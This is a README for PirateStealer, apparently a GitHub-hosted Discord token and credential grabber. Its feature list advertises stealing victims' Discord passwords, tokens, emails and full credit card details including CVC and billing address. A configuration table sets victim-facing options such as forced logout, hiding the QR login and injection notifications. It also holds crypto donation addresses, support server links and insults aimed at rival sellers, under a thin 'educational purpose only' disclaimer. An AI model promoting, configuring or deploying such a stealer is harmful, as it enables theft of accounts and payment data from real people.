### many detections

##### INSTRUCTIONS IN src/undetected/builder/readme.md 

#### ⚠️ Proof Of Concept && Educational Purpose Only ⚠️

## Table of Content
- [Read This](https://github.com/bytixo/PirateStealer#read-this-please)
- [Support Server](https://github.com/bytixo/PirateStealer#need-support-)
- [Donate](https://github.com/bytixo/PirateStealer#donate)
- [Login Showcase](https://github.com/bytixo/PirateStealer#login)
- [Password Changed Showcase](https://github.com/bytixo/PirateStealer#changed-password)
- [Key Features](https://github.com/bytixo/PirateStealer#features)
- [Configuration](https://github.com/bytixo/PirateStealer#configuration)

## Skids hall 
(changing embed colour and removing PirateStealer mention doesnt make your grabber selfcoded dumbass)
- [PrimeFA](https://cdn.discordapp.com/attachments/902316110198767626/902427254674563092/partial.js) Thx Hideaki for deobfuscation. Spastic owner thinking that making an api gives him the rights to [sell](https://ibb.co/MfnzJC9) PirateStealer
- Baba Stealer
- RapidFA
- Zerian
- DemonFA
- KingFA
- and others lol
# PirateStealer 


## Read this please
I'm not the original owner of this repository

As you may know stanley deleted all of his repositories since he don't want to be associated with malware developpement anymore, as you can see he transfered ownership to me but what does that mean ? 

I will try to update PirateStealer, but take into account that I don't have that much free time to work on it due to college stuff bla-bla...

### You were targeted by this malware
Sorry but don't come at me since I'm not responsible of what people do with this repo

Check these repos: 
- [Asabira](https://github.com/bytixo/Asabira) (Work in Progress atm)
- [DC-Malware-Detector](https://github.com/bytixo/Discord-Malware-Detector)

## Official PirateStealer repository

![](https://media.discordapp.net/attachments/877960059781529710/878229324262699089/PirateMonster-removebg-preview_3.png)

# Need support ?

https://discord.gg/racismhq or https://discord.gg/rX52gkDQkp

Discord: 0x7BTX

# Donate 

## Bytixoh (maintainer)

Bitcoin: `bc1q5jj06v9fp5nzxp4tagc6m46r2jrcxmu4l69cvu`

## Stanley (Original repository owner)
Bitcoin: `bc1qpxqkyz62d6e6yrpjjp25q4pr3vjklx9mxn9fn4`

Ethereum: `0x3841C8F8d9D7428fF95c8771e0bd22B7bd02dD6e`

Doge: `D5yxhkGnMhFPauc9zeARtLdJNp4j7LB87U`


### Login
![Login](https://media.discordapp.net/attachments/870608841623085100/901462244527861800/unknown.png?width=454&height=616)
### Changed Password
![Password](https://media.discordapp.net/attachments/870608841623085100/901462254875193414/unknown.png?width=517&height=616)

# Features
- Log all friends owning a "rare" badge
- Discord Credit Card Stealing
    - Credit Card Number
    - CVC
    - Credit Card Expirations (month & years)
    - Country
    - State
    - City
    - ZIP Code
    - Address
    - Username
    - Nitro
    - Badges
    - ID
    - Email
    - Token
- Discord Login Stealing
    - Username
    - Nitro
    - Badges
    - ID
    - Email
    - Password
    - Token
    - Valid Billing and type
- Discord Change Password
    - Username
    - Nitro
    - Badges
    - ID
    - Old Password
    - New Password
    - Token
    - Valid Billing and type
- Discord Change Email
    - Username
    - Nitro
    - Badges
    - ID
    - New Email
    - Password
    - Token
    - Valid Billing and type
- IP
- Remove QR Code
- BetterDiscord Protection Remover

# Configuration
|            Name | Description                                                                                                                                          | Example     | Type    |
|----------------:|------------------------------------------------------------------------------------------------------------------------------------------------------|-------------|---------|
| platform        | An array containing all the platforms you want your grabber to work on.                                                                              | ["windows"] | array   |
| logout          | False: Do not log out delayed: Disconnect the next time you launch Discord Instant: Kill Discord and ask to reconnect                                   | "instant"   | boolean |
| inject-notify   | False: Does not send a message when the grabber has successfully injected True: Send a message when the grabber has successfully injected            | "true"      | boolean |
| logout-notify   | False: Does not send a message when the victim has successfully logged out True: Send a message when the victim has successfully logged out          | "false"     | boolean |
| init-notify     | False: Does not send a message when the grabber has been initialized in the victim discord client True: Send the message                             | "false"     | boolean |
| embed-color     | The embed color in decimal!                                                                                                                              | "3447704"   | string  |
| disable-qr-code | False: The victim will have access to the authentication QRCode (not recommended) True: The victim will not have access to the authentication QRCode | "true"      | boolean |


# How to contribute
For contribute, make a [pull request](https://github.com/Stanley-GF/PirateStealer/pulls) or open an [issue](https://github.com/Stanley-GF/PirateStealer/issues) with your codes

# Contributors
| Name    | Github                     | Contribute   |
|---------|----------------------------|--------------|
| JustSvK | https://github.com/JustSvK | C++ Injector |
|         |                            |              |
|         |                            |              |
